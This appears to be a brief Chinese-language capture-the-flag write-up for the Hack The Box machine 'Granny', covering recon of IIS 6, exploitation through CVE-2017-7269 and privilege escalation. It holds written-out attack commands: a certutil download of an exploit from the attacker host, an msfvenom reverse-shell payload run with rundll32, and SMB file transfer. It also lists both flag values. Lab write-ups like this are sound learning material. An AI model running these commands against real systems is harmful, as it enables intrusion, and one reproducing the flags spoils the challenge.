# Granny
- URL : https://app.hackthebox.eu/machines/14
- IP : 10.129.2.63

## Recon
- 觀察首頁
    - ![](https://i.imgur.com/sbQcIWf.png)
    - IIS 6
- nmap 掃 port 
    - `nmap -A -p80 10.129.2.63`
    - ![](https://i.imgur.com/yNZQlXN.png)
- 掃目錄
    - ![](https://i.imgur.com/CjmfC20.png)
- 發現一些奇怪的 dll
    - ![](https://i.imgur.com/yZGtChe.png)
    - http://10.129.2.63/_vti_inf.html
    - `FPAuthorScriptUrl="_vti_bin/_vti_aut/author.dll"`
    - `FPAdminScriptUrl="_vti_bin/_vti_adm/admin.dll"`
    - `TPScriptUrl="_vti_bin/owssvr.dll"`

## Exploit
- https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269
    - ![](https://i.imgur.com/EOeoMgt.png)
- nc 收 shell
    - ![](https://i.imgur.com/7HqJyNX.png)
- 確認使用者
    - ![](https://i.imgur.com/X8v5anL.png)
- systeminfo
    - ![](https://i.imgur.com/9WVQAXz.png)
- 送 `windows-exploit-suggester.py`
    - ![](https://i.imgur.com/xLOYh1g.png)
- 測 CVE-2015-1701
    - https://github.com/hfiref0x/CVE-2015-1701
    - `certutil -urlcache -f http://10.10.16.35/Taihou32.exe Taihou32.exe`
    - ![](https://i.imgur.com/60L0w3I.png)
    - ![](https://i.imgur.com/KXnF3bF.png)
    - `impacket-smbserver meow .`
    - `copy \\10.10.16.35\meow\Taihou32.exe Taihou32.exe`
    - shell 卡住不能用 QQQ

## 提權
- 準備 shell
    - `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.35 LPORT=7878 -f dll > s.dll`
    - `rundll32 s.dll`
- `churrasco`
    - ![](https://i.imgur.com/3TwWxzC.png)
    - churrasco.exe -d "shellx86.exe"
- nc 收 shell
    - ![](https://i.imgur.com/xFp3xBs.png)
- User flag
    - ![](https://i.imgur.com/fdfbgPb.png)
    - `700c5dc163014e22b3e408f8703f67d1`
- Root Flag
    - ![](https://i.imgur.com/5QkzuUu.png)
    - `aa4beed1c0584445ab463a6747bd06e9`
## 學到ㄌ
- smb 傳檔案
- 盡量 webshell QQ
